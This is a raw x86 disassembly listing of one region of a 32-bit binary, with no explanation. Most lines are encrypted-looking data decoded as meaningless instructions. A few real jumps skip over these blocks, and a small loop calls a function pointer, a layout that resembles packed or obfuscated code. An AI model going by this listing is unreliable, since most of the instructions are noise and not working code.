  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	ror    ecx,0xf7
  40f573:	sub    eax,0x7842bbb0
  40f578:	js     0x40f55f
  40f57a:	jle    0x40f5f4
  40f57c:	js     0x40f54d
  40f57e:	loop   0x40f5a0
  40f580:	adc    DWORD PTR ds:0x18660b59,ecx
  40f586:	repnz mov ds:0x18108935,eax
  40f58c:	ds cmp eax,esi
  40f58f:	cdq    
  40f590:	pushf  
  40f591:	in     al,0x2
  40f593:	push   es
  40f594:	add    eax,0xb6435c61
  40f599:	out    0xa8,al
  40f59b:	out    dx,al
  40f59c:	xor    BYTE PTR [eax+0x65],dl
  40f59f:	pushf  
  40f5a0:	stos   BYTE PTR es:[edi],al
  40f5a1:	arpl   WORD PTR [ebp+0x629aa13f],bp
  40f5a7:	mov    eax,ds:0xb2a9ca38
  40f5ac:	sbb    BYTE PTR [ecx+edx*2+0x7b],ch
  40f5b0:	adc    cl,BYTE PTR [edi+0x4e]
  40f5b3:	stos   BYTE PTR es:[edi],al
  40f5b4:	mov    bh,0xdc
  40f5b6:	data16 fwait
  40f5b8:	dec    edx
  40f5b9:	mov    ds:0xe13a8b63,eax
  40f5be:	jnp    0x40f5a4
  40f5c0:	and    DWORD PTR [ecx-0x419ea3d8],0x26b9b620
  40f5ca:	or     dh,cl
  40f5cc:	jnp    0x40f5e6
  40f5ce:	clc    
  40f5cf:	lahf   
  40f5d0:	mov    ebx,fs
  40f5d2:	leave  
  40f5d3:	inc    esp
  40f5d4:	stos   BYTE PTR es:[edi],al
  40f5d5:	sbb    eax,0x6db8a11e
  40f5da:	into   
  40f5db:	lods   eax,DWORD PTR ds:[esi]
  40f5dc:	mov    ds:0x37ef43d6,al
  40f5e1:	xchg   esi,eax
  40f5e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5e3:	lahf   
  40f5e4:	lods   eax,DWORD PTR ds:[esi]
  40f5e5:	repnz pop ss
  40f5e7:	sub    esp,DWORD PTR [ebx-0x16]
  40f5ea:	fiadd  WORD PTR [edx]
  40f5ec:	imul   edx,DWORD PTR [edi+eiz*1-0x421bce5d],0x61ef5d67
  40f5f7:	mov    eax,0x69940e5d
  40f5fc:	or     eax,0x250a65af
  40f601:	jo     0x40f609
  40f603:	int    0x84
  40f605:	retf   
  40f606:	call   0x9000ef89
  40f60b:	into   
  40f60c:	adc    BYTE PTR [edx],dl
  40f60e:	lock (bad) 
  40f610:	sub    ecx,DWORD PTR [eax-0x46]
  40f613:	out    0xe8,al
  40f615:	in     al,0x1e
  40f617:	shr    DWORD PTR [edi-0x19],0xdd
  40f61b:	or     ah,BYTE PTR [esi-0x16]
  40f61e:	and    DWORD PTR [eax],0xffffffc9
  40f621:	jbe    0x40f657
  40f623:	loopne 0x40f626
  40f625:	mov    ebp,0x122786a0
  40f62a:	cmp    esp,ebp
  40f62c:	sbb    eax,edi
  40f62e:	sti    
  40f62f:	mov    ecx,esp
  40f631:	sub    eax,0xed607624
  40f636:	adc    ebp,DWORD PTR [esi+edi*4]
  40f639:	das    
  40f63a:	inc    ebx
  40f63b:	dec    ecx
  40f63c:	jbe    0x40f66c
  40f63e:	fidiv  WORD PTR [ecx]
  40f640:	fmul   DWORD PTR [eax-0x2bdfc924]
  40f646:	mov    ecx,DWORD PTR [ecx+0x56]
  40f649:	ret    
  40f64a:	clc    
  40f64b:	retf   0x6939
  40f64e:	add    al,0x28
  40f650:	push   0xc4c4c209
  40f655:	mov    bl,0x51
  40f657:	mov    DWORD PTR [edx+0x7c7cc19],edi
  40f65d:	cmc    
  40f65e:	cmp    eax,0xc067c956
  40f663:	loop   0x40f631
  40f665:	xor    DWORD PTR ds:0xfa139725,ebx
  40f66b:	lahf   
  40f66c:	cwde   
  40f66d:	dec    eax
  40f66e:	outs   dx,DWORD PTR ds:[esi]
  40f66f:	push   ds
  40f670:	jge    0x40f628
  40f672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f673:	or     al,0xcb
  40f675:	sub    esi,DWORD PTR [ecx]
  40f677:	jl     0x40f67d
  40f679:	test   BYTE PTR [edx-0x34],ah
  40f67c:	fwait
  40f67d:	dec    ecx
  40f67e:	(bad)  
  40f681:	inc    edx
  40f682:	xlat   BYTE PTR ds:[ebx]
  40f683:	sub    eax,DWORD PTR [edi-0x2d]
  40f686:	dec    ecx
  40f687:	xlat   BYTE PTR ds:[ebx]
  40f688:	sub    ebp,eax
  40f68a:	dec    ecx
  40f68b:	jecxz  0x40f6fc
  40f68d:	push   0xef43efa5
  40f692:	fnstsw WORD PTR [edx-0x78]
  40f695:	ds (bad) 
  40f697:	xchg   esi,eax
  40f698:	cmp    eax,0x79820bf
  40f69d:	data16 div dl
  40f6a0:	daa    
  40f6a1:	push   edi
  40f6a2:	das    
  40f6a3:	cdq    
  40f6a4:	mov    esi,0xda919b0
  40f6a9:	repz mov ch,0x84
  40f6ac:	dec    eax
  40f6ad:	retf   0x1d81
  40f6b0:	fstp   TBYTE PTR ds:0x2435b4c
  40f6b6:	cdq    
  40f6b7:	cmp    DWORD PTR [ecx-0x536fd7bb],esp
  40f6bd:	jg     0x40f6f7
  40f6bf:	jnp    0x40f641
  40f6c1:	push   ebx
  40f6c2:	stc    
  40f6c3:	add    al,0x28
  40f6c5:	mov    DWORD PTR [esi+0x3e],ebp
  40f6c8:	jns    0x40f693
  40f6ca:	mov    ebp,0x3591d485
  40f6cf:	push   ecx
  40f6d0:	jl     0x40f670
  40f6d2:	retf   
  40f6d3:	out    0xd5,al
  40f6d5:	or     esp,DWORD PTR [esi+0x44]
  40f6d8:	and    edi,DWORD PTR [eax+0x55d7bbe5]
  40f6de:	stc    
  40f6df:	cwde   
  40f6e0:	dec    esi
  40f6e1:	mov    esi,0xe32970d7
  40f6e6:	sti    
  40f6e7:	jmp    FWORD PTR [edx]
  40f6e9:	xor    BYTE PTR [ebp-0x29773f96],0xe4
  40f6f0:	cwde   
  40f6f1:	mov    dl,0xce
  40f6f3:	inc    edi
  40f6f4:	mov    DWORD PTR [ebp+0x5f],0xe66242c9
  40f6fb:	loop   0x40f6cb
  40f6fd:	adc    edx,eax
  40f6ff:	jno    0x40f6fe
  40f701:	imul   esi,DWORD PTR [edx],0xe355602f
  40f707:	push   eax
  40f708:	mov    eax,0xcc92a279
  40f70d:	jg     0x40f736
  40f70f:	push   esp
  40f710:	leave  
  40f711:	test   al,0xb
  40f713:	push   ebp
  40f714:	sub    eax,0x31400a90
  40f719:	aam    0x77
  40f71b:	xor    ecx,DWORD PTR [edi+0x1e]
  40f71e:	push   eax
  40f71f:	mov    ebx,0xf5b99804
  40f724:	popf   
  40f725:	sbb    eax,0xa689dcb6
  40f72a:	adc    eax,0x4877dcb0
  40f72f:	pop    eax
  40f730:	mov    esp,0x1b1d1a24
  40f735:	cmp    ebp,DWORD PTR [ecx+0x1d]
  40f738:	jbe    0x40f753
  40f73a:	addr16 push ss
  40f73c:	leave  
  40f73d:	cmp    ebp,DWORD PTR [ebp-0x74d53c2f]
  40f743:	cmp    DWORD PTR [ecx+ecx*1-0x5a],ebx
  40f747:	mov    edx,0xab8f62d2
  40f74c:	and    DWORD PTR [eax],ebp
  40f74e:	popa   
  40f74f:	retf   0x36d0
  40f752:	jne    0x40f74e
  40f754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f755:	pop    ecx
  40f756:	repz xchg ebp,edi
  40f759:	and    dh,bl
  40f75b:	cmc    
  40f75c:	addr16 inc ecx
  40f75e:	addr16 rdpmc 
  40f761:	sub    ebx,esp
  40f763:	scas   eax,DWORD PTR es:[edi]
  40f764:	test   DWORD PTR [eax+0x7dacd2be],ebx
  40f76a:	xchg   DWORD PTR [esi+esi*2-0x5e8c2785],ebp
  40f771:	sahf   
  40f772:	cli    
  40f773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f774:	int3   
  40f775:	test   eax,0xf58620f4
  40f77a:	push   ss
  40f77b:	mov    bh,0xdd
  40f77d:	ret    0xfc9d
  40f780:	mov    eax,ds:0xb0afa775
  40f785:	push   0x131e6b0d
  40f78a:	ffreep st(5)
  40f78c:	retf   0x1176
  40f78f:	lahf   
  40f790:	push   0xdf949a69
  40f795:	clc    
  40f796:	add    DWORD PTR [ecx-0x11],ebx
  40f799:	push   ecx
  40f79a:	dec    edi
  40f79b:	jbe    0x40f7ca
  40f79d:	mov    ds:0x68ea6a7e,al
  40f7a2:	mov    bh,0xf6
  40f7a4:	(bad)  
  40f7a5:	loop   0x40f76c
  40f7a7:	pusha  
  40f7a8:	adc    cl,BYTE PTR [edi]
  40f7aa:	dec    esi
  40f7ab:	pop    ecx
  40f7ac:	stos   BYTE PTR es:[edi],al
  40f7ad:	fwait
  40f7ae:	mov    WORD PTR [edx-0x9a1b253],?
  40f7b4:	in     eax,0xd1
  40f7b6:	or     eax,0xe58289ed
  40f7bb:	or     eax,0x28173b4f
  40f7c0:	sar    BYTE PTR [edx-0x53],1
  40f7c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c4:	data16 fdivr st,st(6)
  40f7c7:	xor    eax,DWORD PTR [edi+0x5463e00f]
  40f7cd:	push   esp
  40f7ce:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40f7d0:	pop    ebx
  40f7d1:	inc    edx
  40f7d2:	fwait
  40f7d3:	cmp    BYTE PTR ds:0x8dbf3dcc,bl
  40f7d9:	cmp    al,0x12
  40f7db:	sub    edi,DWORD PTR [ebx-0x4e]
  40f7de:	add    ecx,edi
  40f7e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7e1:	retf   
  40f7e2:	ror    DWORD PTR [edx+0x37317352],0x3
  40f7e9:	sar    DWORD PTR [ebx],1
  40f7eb:	cli    
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x9ca1495f,ch
  40f80a:	aas    
  40f80b:	and    BYTE PTR [edi+0x78],al
  40f80e:	js     0x40f7f5
  40f810:	jle    0x40f88a
  40f812:	js     0x40f82b
  40f814:	and    DWORD PTR [esi+0x5b8ed632],edx
  40f81a:	xchg   ebx,eax
  40f81b:	ret    
  40f81c:	inc    ebx
  40f81d:	ins    BYTE PTR es:[edi],dx
  40f81e:	pop    ds
  40f81f:	inc    eax
  40f820:	pop    ebx
  40f821:	cmc    
  40f822:	sti    
  40f823:	jp     0x40f7b4
  40f825:	adc    eax,0xb0fdd701
  40f82a:	ins    BYTE PTR es:[edi],dx
  40f82b:	mov    es,WORD PTR [edi-0x4e84c21a]
  40f831:	cmp    DWORD PTR [edx],esp
  40f833:	xchg   ebx,eax
  40f834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f835:	mov    eax,0x9278fa0
  40f83a:	or     eax,0xd92a1ffa
  40f83f:	push   eax
  40f840:	lods   al,BYTE PTR ds:[esi]
  40f841:	mov    edi,0x7a698edc
  40f846:	adc    dl,dl
  40f848:	adc    dh,BYTE PTR [edx-0x7c]
  40f84b:	mov    ecx,ss
  40f84d:	adc    eax,0xe8b8cd7b
  40f852:	jl     0x40f866
  40f854:	arpl   WORD PTR [ebx-0x2017e8e5],bx
  40f85a:	push   0xcb3e8844
  40f85f:	jnp    0x40f8ca
  40f861:	inc    eax
  40f862:	dec    edi
  40f863:	lods   al,BYTE PTR ds:[esi]
  40f864:	pop    edi
  40f865:	cdq    
  40f866:	addr16 jnp 0x40f7f9
  40f869:	dec    esi
  40f86a:	jg     0x40f895
  40f86c:	push   esi
  40f86d:	in     al,0x21
  40f86f:	shr    BYTE PTR [esi-0x2e0096bf],0xc7
  40f876:	or     al,bl
  40f878:	push   0x19
  40f87a:	sbb    eax,0x431f9d0b
  40f87f:	add    ecx,esi
  40f881:	ret    
  40f882:	jl     0x40f89f
  40f884:	into   
  40f885:	sbb    eax,0xf2d1b852
  40f88a:	or     esi,DWORD PTR [edi+0x35]
  40f88d:	out    dx,al
  40f88e:	jno    0x40f8b1
  40f890:	outs   dx,BYTE PTR ds:[esi]
  40f891:	pop    edi
  40f892:	dec    eax
  40f893:	adc    ah,BYTE PTR [eax]
  40f895:	push   0xffffff82
  40f897:	mov    ch,0x48
  40f899:	mov    dl,0x20
  40f89b:	jae    0x40f88a
  40f89d:	fsubr  st,st(2)
  40f89f:	fild   QWORD PTR [esi+ebx*2]
  40f8a2:	outs   dx,BYTE PTR ds:[esi]
  40f8a3:	sbb    esp,DWORD PTR [edi-0x1688330c]
  40f8a9:	ret    
  40f8aa:	shl    DWORD PTR [edi-0x74],0x65
  40f8ae:	xor    ah,BYTE PTR [edx-0x4e4f540d]
  40f8b4:	and    eax,0x4ebbff35
  40f8b9:	push   ss
  40f8ba:	clc    
  40f8bb:	cmp    BYTE PTR [ebx-0x310b6d1f],bh
  40f8c1:	or     DWORD PTR [edx-0x572efcbc],0xffffffe3
  40f8c8:	aas    
  40f8c9:	lock push ds
  40f8cb:	mov    bh,0x76
  40f8cd:	in     al,0x1e
  40f8cf:	mov    ebx,0xad392685
  40f8d4:	sub    ebx,ecx
  40f8d6:	repz es ret 0x308b
  40f8db:	inc    ebp
  40f8dc:	shr    DWORD PTR [edi+ebx*2+0x4429a92d],0x17
  40f8e4:	pop    edx
  40f8e5:	lods   eax,DWORD PTR ds:[esi]
  40f8e6:	pop    es
  40f8e7:	cmp    bh,dh
  40f8e9:	jbe    0x40f897
  40f8eb:	pop    esp
  40f8ec:	call   0x2e1f2334
  40f8f1:	or     al,0x5f
  40f8f3:	mov    eax,ds:0x29ddf057
  40f8f8:	cmc    
  40f8f9:	jns    0x40f8e2
  40f8fb:	in     al,0xf4
  40f8fd:	adc    edx,esi
  40f8ff:	cmp    al,0x4d
  40f901:	jae    0x40f944
  40f903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f904:	repnz sub bl,al
  40f907:	sahf   
  40f908:	ins    DWORD PTR es:[edi],dx
  40f909:	jno    0x40f8fb
  40f90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f90c:	lahf   
  40f90d:	cld    
  40f90e:	push   esi
  40f90f:	dec    edx
  40f910:	test   DWORD PTR [ecx+0x52],edx
  40f913:	add    DWORD PTR [esi],ecx
  40f915:	popf   
  40f916:	cwde   
  40f917:	(bad)  
  40f918:	push   edi
  40f919:	jl     0x40f97b
  40f91b:	inc    eax
  40f91c:	test   BYTE PTR [edi-0x1d],bl
  40f91f:	cdq    
  40f920:	jne    0x40f974
  40f922:	xor    bh,BYTE PTR [ecx]
  40f924:	xor    BYTE PTR [edx],0x6f
  40f927:	sub    bh,BYTE PTR [ecx+0x24]
  40f92a:	mov    edi,0x8719fa2b
  40f92f:	repz retf 0x1e99
  40f933:	cmp    eax,0xfc6908a8
  40f938:	or     BYTE PTR [ebx-0xa],dh
  40f93b:	in     eax,0xb9
  40f93d:	rcr    dl,cl
  40f93f:	enter  0xe0b3,0xb0
  40f943:	pop    ebx
  40f944:	xchg   BYTE PTR [eax+edx*1],dh
  40f947:	sub    BYTE PTR ds:0xb847d04c,bl
  40f94d:	dec    eax
  40f94e:	loope  0x40f98d
  40f950:	xchg   ebx,eax
  40f951:	aas    
  40f952:	dec    DWORD PTR [ebx+esi*2]
  40f955:	fisubr WORD PTR ds:0x8eaa15c5
  40f95b:	scas   al,BYTE PTR es:[edi]
  40f95c:	or     BYTE PTR [ebx-0x5d26ee35],dh
  40f962:	cwde   
  40f963:	nop
  40f964:	inc    esp
  40f965:	and    eax,0x788a3f05
  40f96a:	sub    DWORD PTR [esi-0x642fbef],ebx
  40f970:	push   ds
  40f971:	cmc    
  40f972:	rcr    BYTE PTR [ebx+esi*4-0x47],1
  40f976:	jg     0x40f9a6
  40f978:	repnz and BYTE PTR [edi+eiz*1],bh
  40f97c:	sub    DWORD PTR ds:[esp+edi*8+0x16],ecx
  40f981:	add    esp,DWORD PTR [eax+0x6e08079]
  40f987:	leave  
  40f988:	sub    al,BYTE PTR [ecx-0x11f2ad65]
  40f98e:	sbb    eax,0x796b8c41
  40f993:	rcr    BYTE PTR [ebp+0x1f],cl
  40f996:	jmp    0x40f931
  40f998:	popf   
  40f999:	cli    
  40f99a:	mov    dl,0xc9
  40f99c:	pop    edi
  40f99d:	jne    0x40f981
  40f99f:	pop    edi
  40f9a0:	sbb    BYTE PTR [esi+0x72],al
  40f9a3:	rcr    DWORD PTR [edx+0x368ab8be],0x18
  40f9aa:	stos   DWORD PTR es:[edi],eax
  40f9ab:	xor    ch,BYTE PTR [eax]
  40f9ad:	pop    esp
  40f9ae:	call   0xed08:0x10e30743
  40f9b5:	dec    ebx
  40f9b6:	mov    esp,0x9de2864c
  40f9bb:	mov    ds:0xbda55b6a,eax
  40f9c0:	test   DWORD PTR [edi+0x16],ebp
  40f9c3:	enter  0x7a81,0xf1
  40f9c7:	shr    BYTE PTR [ebp-0x67],1
  40f9ca:	adc    DWORD PTR [edi],esp
  40f9cc:	jle    0x40fa48
  40f9ce:	clc    
  40f9cf:	ins    BYTE PTR es:[edi],dx
  40f9d0:	jp     0x40fa0e
  40f9d2:	std    
  40f9d3:	mov    eax,ds:0x50503584
  40f9d8:	(bad)  
  40f9d9:	data16 xchg BYTE PTR [esi+eax*8],ch
  40f9dd:	adc    eax,0xfca3a95
  40f9e2:	dec    ecx
  40f9e3:	mov    cx,0xa432
  40f9e7:	xchg   BYTE PTR [eax-0x53],ah
  40f9ea:	xchg   esi,eax
  40f9eb:	(bad)  
  40f9ec:	dec    esi
  40f9ed:	cli    
  40f9ee:	fst    QWORD PTR [esi+0x6fb12e57]
  40f9f4:	push   edi
  40f9f5:	mov    ch,dh
  40f9f7:	jmp    0x8619e51
  40f9fc:	sbb    esp,esp
  40f9fe:	and    DWORD PTR [edx+0x66],eax
  40fa01:	sub    ebx,esi
  40fa03:	clc    
  40fa04:	jmp    0xf496:0x70bf0279
  40fa0b:	inc    eax
  40fa0c:	pop    es
  40fa0d:	push   esp
  40fa0e:	xrelease mov DWORD PTR [ebp+eax*4+0x7d69ac71],esp
  40fa16:	inc    esp
  40fa17:	cmp    al,0x3e
  40fa19:	mov    bh,0xb0
  40fa1b:	out    dx,eax
  40fa1c:	cmp    esi,ecx
  40fa1e:	ja     0x40fa11
  40fa20:	not    ebp
  40fa22:	push   esi
  40fa23:	shl    ch,cl
  40fa25:	and    ch,bl
  40fa27:	lods   al,BYTE PTR ds:[esi]
  40fa28:	xchg   ebp,eax
  40fa29:	mov    ds:0x29f480b9,al
  40fa2e:	mov    esi,0x7fe0a514
  40fa33:	leave  
  40fa34:	test   eax,0x4abc1922
  40fa39:	cmc    
  40fa3a:	outs   dx,BYTE PTR ds:[esi]
  40fa3b:	jle    0x40faa4
  40fa3d:	popf   
  40fa3e:	in     eax,dx
  40fa3f:	xor    eax,0xe5240738
  40fa44:	(bad)  
  40fa45:	xchg   ecx,eax
  40fa46:	jge    0x40faa0
  40fa48:	mov    ah,0x29
  40fa4a:	add    ebp,eax
  40fa4c:	inc    eax
  40fa4d:	jmp    0x28928251
  40fa52:	sub    esi,esi
  40fa54:	hlt    
  40fa55:	adc    bl,BYTE PTR [edx-0x47]
  40fa58:	fcom   DWORD PTR [edx-0x5b139df0]
  40fa5e:	xchg   edx,eax
  40fa5f:	loopne 0x40fa9a
  40fa61:	(bad)  
  40fa62:	icebp  
  40fa63:	stos   BYTE PTR es:[edi],al
  40fa64:	ins    BYTE PTR es:[edi],dx
  40fa65:	outs   dx,BYTE PTR ds:[esi]
  40fa66:	ss ret 0x7e3
  40fa6a:	ja     0x40fa67
  40fa6c:	shr    BYTE PTR [eax],0x7a
  40fa6f:	push   ds
  40fa70:	push   eax
  40fa71:	sub    esi,DWORD PTR [edi]
  40fa73:	or     DWORD PTR [edx-0x11],edx
  40fa76:	jmp    0x40fa46
  40fa78:	xchg   edx,eax
  40fa79:	inc    DWORD PTR [esi]
  40fa7b:	jp     0x40fa11
  40fa7d:	and    eax,0x53ab840f
  40fa82:	add    BYTE PTR [eax],al
  40fa84:	push   ebx
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fa92
  40fb0f:	jmp    0x7878:0x458d2bda
  40fb16:	in     eax,0x7e
  40fb18:	js     0x40fb92
  40fb1a:	xchg   ebp,eax
  40fb1b:	inc    edi
  40fb1c:	lods   al,BYTE PTR ds:[esi]
  40fb1d:	popf   
  40fb1e:	mov    ds:0x50de106c,al
  40fb23:	add    eax,0x1dd88e1e
  40fb28:	mov    ebp,0x7e64236f
  40fb2d:	push   cs
  40fb2e:	pushf  
  40fb2f:	jno    0x40fb2a
  40fb31:	and    esi,ebx
  40fb33:	das    
  40fb34:	sub    al,0x77
  40fb36:	fwait
  40fb37:	mov    ebx,0x90fb7910
  40fb3c:	js     0x40fba6
  40fb3e:	mov    ?,WORD PTR [edi+0x1b]
  40fb41:	sub    DWORD PTR [ecx],esp
  40fb43:	test   BYTE PTR gs:[eax+0x5a],ah
  40fb47:	out    0xdc,eax
  40fb49:	test   eax,0xa3aefc94
  40fb4e:	das    
  40fb4f:	mov    dh,0xfe
  40fb51:	retf   0x6d89
  40fb54:	cmp    DWORD PTR [edx+0xa],eax
  40fb57:	push   ecx
  40fb58:	pop    es
  40fb59:	mov    dl,0xb5
  40fb5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb5c:	inc    ebx
  40fb5d:	test   eax,0x643c932e
  40fb62:	pop    esp
  40fb63:	ins    DWORD PTR es:[edi],dx
  40fb64:	mov    esi,0xf269567f
  40fb69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb6a:	aad    0xd
  40fb6c:	clc    
  40fb6d:	or     cl,cl
  40fb6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb70:	sbb    al,0xae
  40fb72:	push   ecx
  40fb73:	sbb    al,0xa2
  40fb75:	mov    BYTE PTR [ebp+0x72],bl
  40fb78:	push   0xffffffcc
  40fb7a:	mov    ds:0x8b93c70d,eax
  40fb7f:	jbe    0x40fb21
  40fb81:	push   ecx
  40fb82:	dec    esi
  40fb83:	mov    dl,0x29
  40fb85:	fimul  DWORD PTR [edx]
  40fb87:	and    edx,esp
  40fb89:	lahf   
  40fb8a:	adc    ebx,DWORD PTR [ebp+0x18f694da]
  40fb90:	pushf  
  40fb91:	cwde   
  40fb92:	sbb    cl,dl
  40fb94:	xchg   DWORD PTR [eax+0x6151a50b],ebx
  40fb9a:	js     0x40fbf1
  40fb9c:	pop    esp
  40fb9d:	mov    ss,WORD PTR [ebx]
  40fb9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fba0:	rcl    edx,0x67
  40fba3:	or     al,0x6a
  40fba5:	sub    DWORD PTR [ebx],eax
  40fba7:	mov    cl,bh
  40fba9:	scas   eax,DWORD PTR es:[edi]
  40fbaa:	pop    edi
  40fbab:	push   esp
  40fbac:	inc    ebx
  40fbad:	outs   dx,DWORD PTR ds:[esi]
  40fbae:	arpl   WORD PTR [edi-0x4a],dx
  40fbb1:	icebp  
  40fbb2:	jb     0x40fbb1
  40fbb4:	mov    esp,0xdf43a166
  40fbb9:	dec    esp
  40fbba:	jns    0x40fc2d
  40fbbc:	add    ecx,DWORD PTR [eax]
  40fbbe:	xor    al,0x2f
  40fbc0:	dec    eax
  40fbc1:	push   edi
  40fbc2:	daa    
  40fbc3:	test   al,0x11
  40fbc5:	xchg   esi,eax
  40fbc6:	add    BYTE PTR [ecx-0xfe2b9eb],bl
  40fbcc:	dec    eax
  40fbcd:	test   DWORD PTR [ebx],ecx
  40fbcf:	jbe    0xb07cca18
  40fbd5:	inc    esp
  40fbd6:	test   ebp,eax
  40fbd8:	jno    0x40fc56
  40fbda:	adc    eax,0x4d847b8
  40fbdf:	cmc    
  40fbe0:	cdq    
  40fbe1:	out    dx,al
  40fbe2:	pop    ss
  40fbe3:	scas   eax,DWORD PTR es:[edi]
  40fbe4:	cdq    
  40fbe5:	mov    ebx,0xb2143190
  40fbea:	in     eax,0xcf
  40fbec:	inc    esi
  40fbed:	stc    
  40fbee:	clc    
  40fbef:	pop    edi
  40fbf0:	repz out 0xca,eax
  40fbf3:	pusha  
  40fbf4:	sbb    DWORD PTR [edi],edx
  40fbf6:	inc    esi
  40fbf7:	ins    BYTE PTR es:[edi],dx
  40fbf8:	(bad)  
  40fbf9:	ror    edx,1
  40fbfb:	(bad)  
  40fbfc:	cmp    esi,DWORD PTR [esi]
  40fbfe:	cmp    cl,dh
  40fc00:	push   ebx
  40fc01:	mov    ds:0xd5f1f5ee,al
  40fc06:	arpl   WORD PTR [edi+0x70],si
  40fc09:	dec    BYTE PTR [esi+0x6]
  40fc0c:	dec    edx
  40fc0d:	iret   
  40fc0e:	das    
  40fc0f:	sub    bh,BYTE PTR [edx+0x15]
  40fc12:	sbb    DWORD PTR [ecx],edi
  40fc14:	mov    bh,0xdf
  40fc16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc17:	cwde   
  40fc18:	mov    ah,0x7b
  40fc1a:	ds je  0x40fc16
  40fc1d:	js     0x40fc4a
  40fc1f:	or     al,0xac
  40fc21:	popa   
  40fc22:	xchg   BYTE PTR [ebx],bh
  40fc24:	pop    edi
  40fc25:	aaa    
  40fc26:	mov    edx,0x2ca62c64
  40fc2b:	fwait
  40fc2c:	in     eax,0x4a
  40fc2e:	das    
  40fc2f:	and    ah,ah
  40fc31:	ret    
  40fc32:	jecxz  0x40fc09
  40fc34:	ret    0xf192
  40fc37:	adc    BYTE PTR [ebx],bl
  40fc39:	jl     0x40fcb5
  40fc3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc3c:	adc    al,0xca
  40fc3e:	das    
  40fc3f:	(bad)  
  40fc40:	xor    esi,DWORD PTR [eax+0x3b97dbb6]
  40fc46:	stc    
  40fc47:	jns    0x40fcb5
  40fc49:	mov    ch,0x4f
  40fc4b:	inc    esi
  40fc4c:	dec    esp
  40fc4d:	stos   DWORD PTR es:[edi],eax
  40fc4e:	and    al,0xa8
  40fc50:	mov    al,0xd7
  40fc52:	adc    al,0x90
  40fc54:	(bad)  
  40fc55:	sub    eax,0xe01e18e8
  40fc5a:	rdmsr  
  40fc5c:	sbb    BYTE PTR [ebx],ah
  40fc5e:	aaa    
  40fc5f:	add    esp,DWORD PTR [ebp+0x1a]
  40fc62:	pop    eax
  40fc63:	(bad)  
  40fc65:	inc    esi
  40fc66:	(bad)  
  40fc69:	lea    edi,[esi-0x437b5d6f]
  40fc6f:	mov    es,WORD PTR [edx-0x512ec6f5]
  40fc75:	cmp    al,0xb4
  40fc77:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc79:	lods   eax,DWORD PTR ds:[esi]
  40fc7a:	jmp    0x8a38075f
  40fc7f:	rcl    DWORD PTR [ebp-0x3843fa],cl
  40fc85:	lods   al,BYTE PTR ds:[esi]
  40fc86:	test   al,0xa8
  40fc88:	push   cs
  40fc89:	daa    
  40fc8a:	mov    bh,0xe0
  40fc8c:	loope  0x40fcb7
  40fc8e:	sahf   
  40fc8f:	(bad)  [eax-0x2]
  40fc92:	shl    al,1
  40fc94:	arpl   WORD PTR [ebx+0x5c78f218],bp
  40fc9a:	int3   
  40fc9b:	adc    dl,BYTE PTR [ebp-0x542db3b8]
  40fca1:	mov    ah,0xbe
  40fca3:	fist   DWORD PTR ds:0xdaf62337
  40fca9:	popf   
  40fcaa:	or     eax,esp
  40fcac:	ds dec esi
  40fcae:	sbb    BYTE PTR [edi+0x7d],cl
  40fcb1:	push   ds
  40fcb2:	cwde   
  40fcb3:	pop    edx
  40fcb4:	(bad)  
  40fcb5:	jbe    0x40fc46
  40fcb7:	pop    ds
  40fcb8:	lods   eax,DWORD PTR ds:[esi]
  40fcb9:	inc    ax
  40fcbb:	cdq    
  40fcbc:	popf   
  40fcbd:	jb     0x40fce4
  40fcbf:	aas    
  40fcc0:	push   ebp
